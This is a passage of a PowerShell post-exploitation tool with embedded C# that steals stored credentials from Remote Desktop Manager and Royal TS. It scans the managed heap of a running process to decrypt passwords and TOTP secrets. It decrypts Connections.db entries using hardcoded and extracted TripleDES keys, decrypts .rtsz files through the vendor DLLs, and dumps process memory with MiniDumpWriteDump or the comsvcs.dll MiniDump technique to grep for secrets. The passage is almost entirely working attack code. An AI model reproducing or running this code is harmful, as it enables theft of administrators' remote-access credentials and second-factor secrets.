                    if (!string.IsNullOrEmpty(e.docName) && knownDocPwd.TryGetValue(e.docName, out cachedDp))
                    {
                        try {
                            plainPwd = (string)(decMethod.Invoke(siInst, new object[] { e.encPwd, false, cachedDp }) ?? "");
                            if (!string.IsNullOrEmpty(plainPwd)) usedDp = cachedDp;
                        } catch {}
                    }

                    // Try all candidates
                    if (string.IsNullOrEmpty(plainPwd))
                    {
                        foreach (var dp in docPwdCandidates)
                        {
                            try {
                                plainPwd = (string)(decMethod.Invoke(siInst, new object[] { e.encPwd, false, dp }) ?? "");
                                if (!string.IsNullOrEmpty(plainPwd)) { usedDp = dp; break; }
                            } catch {}
                        }
                    }

                    // Cache the working doc password
                    if (!string.IsNullOrEmpty(plainPwd) && !string.IsNullOrEmpty(e.docName))
                        knownDocPwd[e.docName] = usedDp;

                    // Decrypt TOTP secret
                    if (!string.IsNullOrEmpty(e.encTotp))
                    {
                        try {
                            plainTotp = (string)(decMethod.Invoke(siInst, new object[] { e.encTotp, false, usedDp }) ?? "");
                        } catch {}
                    }
                }
                Console.WriteLine($"TYPE:{e.type}|NAME:{e.name}|HOST:{e.host}|USER:{e.user}|TOTP:{plainTotp}|OTPALGO:{e.otpAlgo}|OTPDIGITS:{e.otpDigits}|OTPPERIOD:{e.otpPeriod}|OTPLABEL:{e.otpLabel}|PASS:{plainPwd}");
            }

            Console.WriteLine("##RESULTS_END##");
        }
    }
}
'@
    if (-not $scannerCmd) {
        # Build from source using dotnet SDK
        $fullHash = [System.BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash(
            [System.Text.Encoding]::UTF8.GetBytes($csCode + $dotnetTfm)
        )).Replace('-','')
        $oldHash = if (Test-Path $hashFile) { (Get-Content $hashFile -Raw).Trim() } else { '' }
        $needsSetup = (-not (Test-Path $csprojPath)) -or ($fullHash -ne $oldHash)
        if ($needsSetup) {
            Write-Host "[*] Setting up ClrMD project ($dotnetTfm)..." -ForegroundColor Cyan
            New-Item -ItemType Directory -Force -Path $projectDir | Out-Null
            Remove-Item (Join-Path $projectDir "bin") -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item (Join-Path $projectDir "obj") -Recurse -Force -ErrorAction SilentlyContinue
            @"
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>$dotnetTfm</TargetFramework>
    <Nullable>enable</Nullable>
  </PropertyGroup>
  <ItemGroup>
    <PackageReference Include="Microsoft.Diagnostics.Runtime" Version="4.2.751201" />
  </ItemGroup>
</Project>
"@ | Set-Content (Join-Path $projectDir "HeapDumper.csproj") -Encoding utf8
            $csCode | Set-Content (Join-Path $projectDir "Program.cs") -Encoding utf8
            Write-Host "[*] Restoring NuGet packages..." -ForegroundColor Cyan
            Push-Location $projectDir
            $restoreOut = dotnet restore --verbosity quiet 2>&1
            Pop-Location
            if ($LASTEXITCODE -ne 0) {
                Write-Host "[!] NuGet restore failed:" -ForegroundColor Red
                $restoreOut | ForEach-Object { Write-Host "    $_" -ForegroundColor Red }
                exit 1
            }
            $fullHash | Set-Content $hashFile -NoNewline
        }
        $scannerCmd = "dotnet run --project `"$projectDir`" -c Release -- $($proc.Id) `"$rtInstallDir`""
    }

    Write-Host "[*] Running ClrMD heap scan + decrypt..." -ForegroundColor Cyan
    $output = Invoke-Expression "$scannerCmd 2>&1"

    # Show ALL output for debugging if no results found
    $hasResults = $false
    foreach ($line in $output) { if ("$line" -eq '##RESULTS_START##') { $hasResults = $true; break } }
    if (-not $hasResults) {
        Write-Host "[!] Scanner produced no results. Full output:" -ForegroundColor Red
        foreach ($line in $output) { Write-Host "    $line" -ForegroundColor DarkYellow }
    }

    $inResults = $false
    $credentials = @()

    foreach ($line in $output) {
        $s = "$line"
        if ($s -match '^\[') { Write-Host $s -ForegroundColor DarkGray }
        elseif ($s -match 'error|Error|FAILED|exception' -and -not $inResults) { Write-Host $s -ForegroundColor Red }
        if ($s -eq '##RESULTS_START##') { $inResults = $true; continue }
        if ($s -eq '##RESULTS_END##') { $inResults = $false; continue }

        if ($inResults -and $s -match '^TYPE:(.+?)\|NAME:(.*?)\|HOST:(.*?)\|USER:(.*?)\|TOTP:(.*?)\|OTPALGO:(.*?)\|OTPDIGITS:(.*?)\|OTPPERIOD:(.*?)\|OTPLABEL:(.*?)\|PASS:(.*)$') {
            $credentials += [PSCustomObject]@{
                Type      = $Matches[1]
                Name      = $Matches[2]
                Host      = $Matches[3]
                Username  = $Matches[4]
                TOTP      = $Matches[5]
                OtpAlgo   = $Matches[6]
                OtpDigits = $Matches[7]
                OtpPeriod = $Matches[8]
                OtpLabel  = $Matches[9]
                Password  = $Matches[10]
            }
        }
    }

    Write-Host "`n============================================" -ForegroundColor Yellow
    Write-Host "  CREDENTIALS EXTRACTED (memory)" -ForegroundColor Yellow
    Write-Host "============================================" -ForegroundColor Yellow

    if ($credentials.Count -eq 0) {
        Write-Host "`n  [-] No credentials found on the managed heap." -ForegroundColor DarkYellow
        Write-Host "  [*] The vault may be locked, or SecurityInterface not found." -ForegroundColor DarkYellow
    } else {
        $i = 0
        $decrypted = 0
        $totpCount = 0
        foreach ($e in $credentials) {
            $i++
            $label = if ($e.Name) { "$($e.Name) ($($e.Type))" } else { $e.Type }
            Write-Host "`n  [$i] $label" -ForegroundColor Cyan
            if ($e.Host)     { Write-Host "      Host: $($e.Host)" -ForegroundColor White }
            if ($e.Username) { Write-Host "      User: $($e.Username)" -ForegroundColor White }
            if ($e.Password) {
                Write-Host "      Pass: $($e.Password)" -ForegroundColor Red
                $decrypted++
            } else {
                Write-Host "      Pass: (decryption failed)" -ForegroundColor DarkYellow
            }
            if ($e.TOTP) {
                Write-Host "      TOTP: $($e.TOTP)" -ForegroundColor Magenta
                $totpCount++
                $otpInfo = @()
                if ($e.OtpAlgo)   { $otpInfo += $e.OtpAlgo }
                if ($e.OtpDigits) { $otpInfo += "$($e.OtpDigits) digits" }
                if ($e.OtpPeriod) { $otpInfo += "$($e.OtpPeriod)s" }
                if ($e.OtpLabel)  { $otpInfo += "label=$($e.OtpLabel)" }
                if ($otpInfo.Count -gt 0) { Write-Host "      OTP:  $($otpInfo -join ', ')" -ForegroundColor DarkMagenta }
            }
        }
        $stats = "$($credentials.Count) entry(ies), $decrypted decrypted"
        if ($totpCount -gt 0) { $stats += ", $totpCount TOTP secret(s)" }
        Write-Host "`n  [+] $stats" -ForegroundColor Green
    }

    Write-Host "`n============================================`n" -ForegroundColor Yellow
    exit 0
}


# ═══════════════════════════════════════════
#  MODE: OFFLINE (RDM + Royal TS)
# ═══════════════════════════════════════════

if ($Mode -eq 'offline') {

    $allResults = @()

    # ─── RDM Connections.db ───

    $rdmDb = $DbPath
    if (-not $rdmDb) { $rdmDb = Join-Path $env:LOCALAPPDATA "Devolutions\RemoteDesktopManager\Connections.db" }
    $hasRdm = Test-Path $rdmDb

    # ─── Royal TS .rtsz ───

    $rtszFiles = @()
    if ($RtszPath) {
        if (Test-Path $RtszPath) { $rtszFiles += $RtszPath }
        else { Write-Host "[-] File not found: $RtszPath" -ForegroundColor Red }
    } else {
        $searchPaths = @(
            "$env:USERPROFILE\Documents\*.rtsz",
            "$env:USERPROFILE\Desktop\*.rtsz",
            "$env:USERPROFILE\Downloads\*.rtsz"
        )
        foreach ($sp in $searchPaths) {
            $rtszFiles += @(Resolve-Path $sp -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path)
        }
    }
    $hasRoyalTS = $rtszFiles.Count -gt 0

    if (-not $hasRdm -and -not $hasRoyalTS) {
        Write-Error "[-] No database found. Use -DbPath or -RtszPath, or run -Mode recon first."
        exit 1
    }

    # ═══════════════════════════════════════
    #  RDM OFFLINE DECRYPTION
    # ═══════════════════════════════════════

    if ($hasRdm) {

    # Extract all GUID keys dynamically from installed RDM DLLs
    $rdmProc = Get-Process -Name RemoteDesktopManager*, RemoteDesktopManager64* -ErrorAction SilentlyContinue | Select-Object -First 1
    $rdmInstall = if ($rdmProc -and $rdmProc.Path) { Split-Path $rdmProc.Path } else { $null }
    if (-not $rdmInstall) {
        $rdmInstall = @("$env:ProgramFiles\Devolutions\Remote Desktop Manager", "${env:ProgramFiles(x86)}\Devolutions\Remote Desktop Manager") | Where-Object { Test-Path $_ } | Select-Object -First 1
    }

    $allKeys = @('jjkdsflkjdf45g65ewrirendu3rewv')
    if ($rdmInstall) {
        $entryModelDll = Join-Path $rdmInstall "RemoteDesktopManager.Business.EntryModel.dll"
        if (Test-Path $entryModelDll) {
            $dllBytes = [System.IO.File]::ReadAllBytes($entryModelDll)
            $dllText = [System.Text.Encoding]::Unicode.GetString($dllBytes)
            $guidMatches = [regex]::Matches($dllText, '\{[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\}')
            $allKeys += @($guidMatches | ForEach-Object { $_.Value } | Sort-Object -Unique)
            Write-Host "[*] Extracted $($allKeys.Count) crypto keys from $(Split-Path $entryModelDll -Leaf)" -ForegroundColor Cyan
        }
    }
    if ($allKeys.Count -le 1) {
        Write-Host "[!] Could not extract keys dynamically, using built-in fallback" -ForegroundColor DarkYellow
        $allKeys += @('{9E6D0FD3-AD2B-4fe1-BBAC-F520BF2F1AE1}','{5B32F3B8-ABDC-4EA0-80BA-93D2657D2EC2}','{9E6D0FD3-AD2B-4fE1-BBAD-F520BF2F1AE1}','{D55AAA6D-B38B-4A6C-95FC-BBF9BD84385B}','{EBDBC0BD-F7CB-4cf1-9CF5-266909C480BC}','{FBF6C5D3-9E59-49ff-A87A-D09300CA11D5}','{BE136E76-C36B-4499-A834-D2892526847B}')
    }

    function Decrypt-RDMPassword {
        param([string]$EncryptedB64, [string]$KeyString)
        if ([string]::IsNullOrEmpty($EncryptedB64)) { return "" }
        try {
            $md5 = [System.Security.Cryptography.MD5]::Create()
            $keyBytes = $md5.ComputeHash([System.Text.Encoding]::ASCII.GetBytes($KeyString))
            $ciphertext = [Convert]::FromBase64String($EncryptedB64)
            $tdes = [System.Security.Cryptography.TripleDES]::Create()
            $tdes.Key = $keyBytes
            $tdes.Mode = [System.Security.Cryptography.CipherMode]::ECB
            $tdes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $dec = $tdes.CreateDecryptor()
            $plainBytes = $dec.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
            return [System.Text.Encoding]::UTF8.GetString($plainBytes)
        } catch {
            return "[DECRYPT_FAILED]"
        }
    }

    Write-Host "[+] Database: $rdmDb" -ForegroundColor Green
    $dbSize = [math]::Round((Get-Item $rdmDb).Length / 1KB)
    Write-Host "[+] Size: ${dbSize} KB" -ForegroundColor Green

    $tempDb = Join-Path $env:TEMP "rcmdump_rdm.db"
    Copy-Item $rdmDb $tempDb -Force

    Write-Host "[*] Reading database entries..." -ForegroundColor Cyan

    $dbBytes = [System.IO.File]::ReadAllBytes($tempDb)
    $dbString = [System.Text.Encoding]::UTF8.GetString($dbBytes)

    $xmlPattern = '(?s)<\?xml version="1\.0"[^?]*\?>\s*<Connection>.*?</Connection>'
    $xmlMatches = [regex]::Matches($dbString, $xmlPattern)

    if ($xmlMatches.Count -eq 0) {
        $xmlPattern = '(?s)<Connection>(?:(?!<Connection>).)*?</Connection>'
        $xmlMatches = [regex]::Matches($dbString, $xmlPattern)
    }

    Write-Host "[+] Found $($xmlMatches.Count) connection entries" -ForegroundColor Green

    $results = @()

    foreach ($xmlMatch in $xmlMatches) {
        try {
            [xml]$entry = $xmlMatch.Value
            $conn = $entry.Connection

            $connType = $conn.ConnectionType
            $name = $conn.Name
            $targetHost = $null
            $user = $null
            $safePwd = $null

            if ($conn.HostDetails) {
                $targetHost = $conn.HostDetails.Host
                $user = $conn.HostDetails.UserName
                $safePwd = $conn.HostDetails.SafePassword
            }
            if ($conn.RDP) {
                if (-not $targetHost) { $targetHost = $conn.RDP.Host }
                if (-not $user) { $user = $conn.RDP.UserName }
                if (-not $safePwd) { $safePwd = $conn.RDP.SafePassword }
            }
            if ($conn.Terminal) {
                if (-not $targetHost) { $targetHost = $conn.Terminal.Host }
                if (-not $user) { $user = $conn.Terminal.UserName }
                if (-not $safePwd) { $safePwd = $conn.Terminal.SafePassword }
            }
            if ($conn.VNC) { if (-not $safePwd) { $safePwd = $conn.VNC.SafePassword } }
            if (-not $targetHost -and $conn.Host) { $targetHost = $conn.Host }
            if (-not $user -and $conn.UserName) { $user = $conn.UserName }
            if (-not $safePwd -and $conn.SafePassword) { $safePwd = $conn.SafePassword }
            if (-not $targetHost -and $conn.Url) { $targetHost = $conn.Url }

            if ([string]::IsNullOrEmpty($safePwd)) { continue }

            $decrypted = '[DECRYPT_FAILED]'
            foreach ($tryKey in $allKeys) {
                $attempt = Decrypt-RDMPassword -EncryptedB64 $safePwd -KeyString $tryKey
                if ($attempt -ne '[DECRYPT_FAILED]' -and $attempt -match '^[\x20-\x7E]+$') {
                    $decrypted = $attempt
                    break
                }
            }

            $results += [PSCustomObject]@{
                Name     = $name
                Type     = $connType
                Host     = $targetHost
                Username = $user
                Password = $decrypted
            }
        } catch {}
    }

    Write-Host "`n============================================" -ForegroundColor Yellow
    Write-Host "  DECRYPTED CREDENTIALS ($($results.Count))" -ForegroundColor Yellow
    Write-Host "============================================" -ForegroundColor Yellow

    if ($results.Count -eq 0) {
        Write-Host "`n  [-] No credentials found in database." -ForegroundColor DarkYellow
    } else {
        $results = $results | Sort-Object Name,Host,Username -Unique
        $i = 0
        foreach ($r in $results) {
            $i++
            Write-Host "`n  [$i] $($r.Name) ($($r.Type))" -ForegroundColor Cyan
            if ($r.Host)     { Write-Host "      Host: $($r.Host)" -ForegroundColor White }
            if ($r.Username) { Write-Host "      User: $($r.Username)" -ForegroundColor White }
            if ($r.Password) { Write-Host "      Pass: $($r.Password)" -ForegroundColor Red }
        }
        Write-Host "`n  [+] Total: $($results.Count) credential(s) decrypted" -ForegroundColor Green
    }

    Write-Host "`n============================================`n" -ForegroundColor Yellow
    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
    $allResults += $results

    } # end RDM

    # ═══════════════════════════════════════
    #  ROYAL TS OFFLINE DECRYPTION
    # ═══════════════════════════════════════

    if ($hasRoyalTS) {

        Write-Host "[*] Royal TS offline decryption" -ForegroundColor Cyan

        $rtInstall = $null
        $searchDirs = @(
            "$env:ProgramFiles\Royal TS V5",
            "$env:ProgramFiles\Royal TS V6",
            "$env:ProgramFiles\Royal TS V7",
            "$env:ProgramFiles\Royal TS V8",
            "${env:ProgramFiles(x86)}\Royal TS V5",
            "${env:ProgramFiles(x86)}\Royal TS V6",
            "${env:ProgramFiles(x86)}\Royal TS V7"
        )
        foreach ($d in $searchDirs) {
            if (Test-Path "$d\RoyalDocument.SecurityInterface.dll") { $rtInstall = $d; break }
        }

        if (-not $rtInstall) {
            Write-Host "[-] Royal TS DLLs not found. Install Royal TS or place DLLs in script folder." -ForegroundColor Red
        } else {

            $rtProjectDir = Join-Path $env:TEMP "RCMDump_RoyalTS"
            $rtCsproj = Join-Path $rtProjectDir "RoyalTSDecrypt.csproj"
            $needsRtSetup = (-not (Test-Path $rtCsproj)) -or ((Get-Content $rtCsproj -Raw) -notmatch 'net10\.0')

            if ($needsRtSetup) {
                Write-Host "[*] Setting up Royal TS decrypt project (first run only)..." -ForegroundColor Cyan
                New-Item -ItemType Directory -Force -Path $rtProjectDir | Out-Null
                New-Item -ItemType Directory -Force -Path (Join-Path $rtProjectDir "dlls") | Out-Null

                $rtDlls = @(
                    "RoyalDocument.dll",
                    "RoyalDocument.SecurityInterface.dll",
                    "RoyalDocument.SecurityInterfaceLegacy.dll",
                    "Rebex.Common.dll",
                    "Rebex.Security.dll",
                    "Rebex.Zip.dll"
                )
                foreach ($dll in $rtDlls) {
                    Copy-Item "$rtInstall\$dll" (Join-Path $rtProjectDir "dlls\$dll") -Force
                }

                @"
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>$dotnetTfm</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="RoyalDocument"><HintPath>dlls\RoyalDocument.dll</HintPath></Reference>
    <Reference Include="RoyalDocument.SecurityInterface"><HintPath>dlls\RoyalDocument.SecurityInterface.dll</HintPath></Reference>
    <Reference Include="RoyalDocument.SecurityInterfaceLegacy"><HintPath>dlls\RoyalDocument.SecurityInterfaceLegacy.dll</HintPath></Reference>
    <Reference Include="Rebex.Common"><HintPath>dlls\Rebex.Common.dll</HintPath></Reference>
    <Reference Include="Rebex.Security"><HintPath>dlls\Rebex.Security.dll</HintPath></Reference>
    <Reference Include="Rebex.Zip"><HintPath>dlls\Rebex.Zip.dll</HintPath></Reference>
  </ItemGroup>
</Project>
"@ | Set-Content $rtCsproj -Encoding utf8

                $rtCs = @'
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;

class Program
{
    static void Main(string[] args)
    {
        if (args.Length < 2) { Console.WriteLine("Usage: RoyalTSDecrypt <rtInstall> <rtszPath> [docPassword]"); return; }
        string rtInstall = args[0];
        string rtszPath = args[1];
        string docPassword = args.Length > 2 ? args[2] : "";

        AppDomain.CurrentDomain.AssemblyResolve += (sender, e) =>
        {
            var asmName = new AssemblyName(e.Name).Name + ".dll";
            var path = Path.Combine(rtInstall, asmName);
            if (File.Exists(path)) return Assembly.LoadFrom(path);
            return null;
        };

        var mainDll = Assembly.LoadFrom(Path.Combine(rtInstall, "RoyalDocument.dll"));
        var secDll = Assembly.LoadFrom(Path.Combine(rtInstall, "RoyalDocument.SecurityInterface.dll"));
        var legDll = Assembly.LoadFrom(Path.Combine(rtInstall, "RoyalDocument.SecurityInterfaceLegacy.dll"));

        var secType = secDll.GetTypes().First(t => t.Name == "RoyalSecurityInterface");
        var legSecType = legDll.GetTypes().First(t => t.Name == "RoyalSecurityInterfaceLegacy");
        var secInstance = Activator.CreateInstance(secType);
        var legSecInstance = Activator.CreateInstance(legSecType);

        var platformsType = mainDll.GetType("RoyalDocumentLibrary.Platforms")!;
        var windowsVal = Enum.Parse(platformsType, "Windows");

        var storeType = mainDll.GetType("RoyalDocumentLibrary.RoyalStore")!;
        var ctor = storeType.GetConstructors(BindingFlags.Public | BindingFlags.Instance)[0];
        var store = ctor.Invoke(new object?[] { Environment.UserName, "", windowsVal, legSecInstance, secInstance, null, null, 7, Array.Empty<string>() });

        var loadDoc = storeType.GetMethod("LoadDocument", new[] { typeof(string), typeof(string) })!;
        object doc;
        try { doc = loadDoc.Invoke(store, new object[] { rtszPath, docPassword })!; }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] LoadDocument failed: {ex.InnerException?.Message ?? ex.Message}");
            return;
        }

        var getAllPwdProps = doc.GetType().GetMethod("GetAllPasswordProperties")!;
        var pwdProps = getAllPwdProps.Invoke(doc, null) as System.Collections.IEnumerable;

        var seen = new HashSet<string>();
        Console.WriteLine("##RESULTS_START##");

        if (pwdProps != null)
        {
            foreach (var tuple in pwdProps)
            {
                var tupleType = tuple.GetType();
                var item1 = tupleType.GetProperty("Item1")?.GetValue(tuple);
                var item2 = tupleType.GetProperty("Item2")?.GetValue(tuple);
                if (item1 == null || item2 == null) continue;

                string typeName = item1.GetType().Name;
                if (typeName == "RoyalDocument" || typeName == "RoyalTrash") continue;

                string objName = GetProp(item1, "Name");
                string objId = GetProp(item1, "ID");
                string propName = GetProp(item2, "Name");

                string key = $"{objId}:{propName}";
                if (seen.Contains(key)) continue;
                seen.Add(key);

                string password = "";
                if (propName == "Password" || propName == "CredentialPassword")
                    password = GetProp(item1, propName);
                if (string.IsNullOrEmpty(password)) continue;

                string host = GetProp(item1, "ComputerName");
                if (string.IsNullOrEmpty(host)) host = GetProp(item1, "URI");
                string user = GetProp(item1, "CredentialUsername");
                if (string.IsNullOrEmpty(user)) user = GetProp(item1, "UserName");
                if (string.IsNullOrEmpty(user)) user = GetProp(item1, "Username");

                Console.WriteLine($"TYPE:{typeName}|NAME:{objName}|HOST:{host}|USER:{user}|PASS:{password}");
            }
        }

        Console.WriteLine("##RESULTS_END##");
    }

    static string GetProp(object obj, string propName)
    {
        try
        {
            var prop = obj.GetType().GetProperty(propName, BindingFlags.Public | BindingFlags.Instance);
            return prop?.GetValue(obj)?.ToString() ?? "";
        }
        catch { return ""; }
    }
}
'@
                $rtCs | Set-Content (Join-Path $rtProjectDir "Program.cs") -Encoding utf8

                Write-Host "[*] Restoring NuGet packages..." -ForegroundColor Cyan
                Push-Location $rtProjectDir
                dotnet restore --verbosity quiet 2>&1 | Out-Null
                Pop-Location
            }

            foreach ($rtszFile in $rtszFiles) {
                Write-Host "`n[+] Royal TS file: $rtszFile" -ForegroundColor Green
                $sz = [math]::Round((Get-Item $rtszFile).Length / 1KB)
                Write-Host "[+] Size: ${sz} KB" -ForegroundColor Green

                $rtOutput = dotnet run --project $rtProjectDir -c Release -- $rtInstall $rtszFile $DocumentPassword 2>&1

                $inRtResults = $false
                foreach ($line in $rtOutput) {
                    $s = "$line"
                    if ($s -match '^\[') { Write-Host $s -ForegroundColor DarkGray }
                    if ($s -eq '##RESULTS_START##') { $inRtResults = $true; continue }
                    if ($s -eq '##RESULTS_END##') { $inRtResults = $false; continue }
                    if ($inRtResults -and $s -match '^TYPE:(.+?)\|NAME:(.+?)\|HOST:(.*?)\|USER:(.*?)\|PASS:(.*)$') {
                        $allResults += [PSCustomObject]@{
                            Name     = $Matches[2]
                            Type     = "RoyalTS/$($Matches[1])"
                            Host     = $Matches[3]
                            Username = $Matches[4]
                            Password = $Matches[5]
                        }
                    }
                }
            }

            # Display Royal TS results
            $rtResults = @($allResults | Where-Object { $_.Type -like 'RoyalTS/*' })
            if ($rtResults.Count -gt 0) {
                Write-Host "`n============================================" -ForegroundColor Yellow
                Write-Host "  ROYAL TS DECRYPTED ($($rtResults.Count))" -ForegroundColor Yellow
                Write-Host "============================================" -ForegroundColor Yellow
                $i = 0
                foreach ($r in $rtResults) {
                    $i++
                    Write-Host "`n  [$i] $($r.Name) ($($r.Type))" -ForegroundColor Cyan
                    if ($r.Host)     { Write-Host "      Host: $($r.Host)" -ForegroundColor White }
                    if ($r.Username) { Write-Host "      User: $($r.Username)" -ForegroundColor White }
                    if ($r.Password) { Write-Host "      Pass: $($r.Password)" -ForegroundColor Red }
                }
                Write-Host "`n  [+] Total: $($rtResults.Count) credential(s) decrypted" -ForegroundColor Green
                Write-Host "`n============================================`n" -ForegroundColor Yellow
            }
        }
    } # end Royal TS

    # Grand total
    if ($allResults.Count -gt 0) {
        Write-Host "[+] Grand total: $($allResults.Count) credential(s) across all sources" -ForegroundColor Green
    }

    exit 0
}


# ═══════════════════════════════════════════
#  MODE: STRINGS (brute-force fallback)
# ═══════════════════════════════════════════

if ($Mode -eq 'strings') {

    $proc = $null
    if ($TargetPid -gt 0) {
        $proc = Get-Process -Id $TargetPid -ErrorAction SilentlyContinue
        if (-not $proc) { Write-Error "[-] PID $TargetPid not found"; exit 1 }
    } elseif ($ProcessName) {
        $proc = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $proc) { Write-Error "[-] Process '$ProcessName' not found"; exit 1 }
    } else {
        foreach ($name in $knownProcesses) {
            $proc = Get-Process -Name $name -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($proc) { break }
        }
        if (-not $proc) { Write-Error "[-] No known connection manager running."; exit 1 }
    }

    Write-Host "[+] Target: $($proc.ProcessName) (PID: $($proc.Id), $([math]::Round($proc.WorkingSet64/1MB))MB)" -ForegroundColor Green

    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;

public class MiniDump {
    [Flags] public enum MINIDUMP_TYPE : uint { MiniDumpWithFullMemory = 0x00000002 }

    [DllImport("dbghelp.dll", SetLastError = true)]
    public static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, IntPtr hFile,
        MINIDUMP_TYPE dumpType, IntPtr exceptionParam, IntPtr userStreamParam, IntPtr callbackParam);

    public static bool Dump(int pid, string path) {
        var p = Process.GetProcessById(pid);
        using (var fs = new FileStream(path, FileMode.Create, FileAccess.ReadWrite, FileShare.None))
            return MiniDumpWriteDump(p.Handle, (uint)pid, fs.SafeFileHandle.DangerousGetHandle(),
                MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
    }
}
"@ -ErrorAction SilentlyContinue

    Add-Type -TypeDefinition @"
using System; using System.Collections.Generic; using System.IO; using System.Text;
public class StringExtractor {
    public static List<string> ExtractUtf16(string path, int minLen, int maxLen) {
        var results = new List<string>(); var sb = new StringBuilder();
        byte[] buffer = new byte[1024 * 1024];
        using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read, buffer.Length)) {
            int bytesRead; int carry = -1;
            while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0) {
                int start = 0;
                if (carry >= 0 && bytesRead > 0) {
                    byte lo = (byte)carry; byte hi = buffer[0]; carry = -1; start = 1;
                    if (hi == 0 && lo >= 0x20 && lo <= 0x7E) sb.Append((char)lo);
                    else { if (sb.Length >= minLen && sb.Length <= maxLen) results.Add(sb.ToString()); sb.Clear(); }
                }
                int end = bytesRead; if ((end - start) % 2 != 0) { carry = buffer[end - 1]; end--; }
                for (int i = start; i < end; i += 2) {
                    byte lo = buffer[i]; byte hi = buffer[i + 1];
                    if (hi == 0 && lo >= 0x20 && lo <= 0x7E) sb.Append((char)lo);
                    else { if (sb.Length >= minLen && sb.Length <= maxLen) results.Add(sb.ToString()); sb.Clear(); }
                }
            }
            if (sb.Length >= minLen && sb.Length <= maxLen) results.Add(sb.ToString());
        }
        return results;
    }
}
"@ -ErrorAction SilentlyContinue

    $dumpFile = Join-Path $env:TEMP "$($proc.ProcessName)_$($proc.Id).dmp"
    Write-Host "[*] Dumping process memory..." -ForegroundColor Cyan

    try { [MiniDump]::Dump($proc.Id, $dumpFile) | Out-Null }
    catch {
        Write-Host "[*] Fallback to comsvcs.dll..." -ForegroundColor Yellow
        cmd /c "rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump $($proc.Id) `"$dumpFile`" full" 2>$null
    }

    if (-not (Test-Path $dumpFile)) { Write-Error "[-] Dump failed."; exit 1 }
    $sz = [math]::Round((Get-Item $dumpFile).Length / 1MB, 1)
    Write-Host "[+] Dump: $sz MB" -ForegroundColor Green

    $strings = [StringExtractor]::ExtractUtf16($dumpFile, 4, 500)
    Write-Host "[+] Extracted $($strings.Count) strings" -ForegroundColor Green

    $credKeywords = @('password', 'passwd', 'pwd', 'secret', 'credential', 'passphrase', 'token')
    $allStrings = $strings.ToArray()
    $found = @()

    for ($i = 0; $i -lt $allStrings.Count; $i++) {
        $lower = $allStrings[$i].ToLower()
        foreach ($kw in $credKeywords) {
            if ($lower -eq $kw -or $lower -match "^${kw}[=:\s]" -or $lower -match "[\.\-_]${kw}$") {
                $start = [Math]::Max(0, $i - 3)
                $end = [Math]::Min($allStrings.Count - 1, $i + 3)
                for ($j = $start; $j -le $end; $j++) {
                    $v = $allStrings[$j]
                    if ($j -ne $i -and $v.Length -ge 3 -and $v.Length -le 128 -and
                        $v -notmatch '(?i)^(system\.|microsoft\.|windows\.|mscorlib|clr)' -and
                        $v -notmatch '^\d+$' -and $v -match '[a-zA-Z]') {
                        $found += [PSCustomObject]@{ Keyword = $allStrings[$i]; Value = $v; Index = $i }
                    }
                }
                break
            }
        }
    }

    Write-Host "`n============================================" -ForegroundColor Yellow
    Write-Host "  POTENTIAL CREDENTIALS (strings mode)" -ForegroundColor Yellow
    Write-Host "============================================" -ForegroundColor Yellow

    if ($found.Count -eq 0) {
        Write-Host "`n  [-] No credentials found." -ForegroundColor DarkYellow
    } else {
        $found | Group-Object Keyword | ForEach-Object {
            Write-Host "`n  Keyword: $($_.Name)" -ForegroundColor Cyan
            $_.Group | ForEach-Object { Write-Host "    -> $($_.Value)" -ForegroundColor White }
        }
    }

    Write-Host "`n============================================`n" -ForegroundColor Yellow
    Remove-Item $dumpFile -Force -ErrorAction SilentlyContinue
    Write-Host "[*] Dump cleaned up" -ForegroundColor DarkGray
    exit 0
}
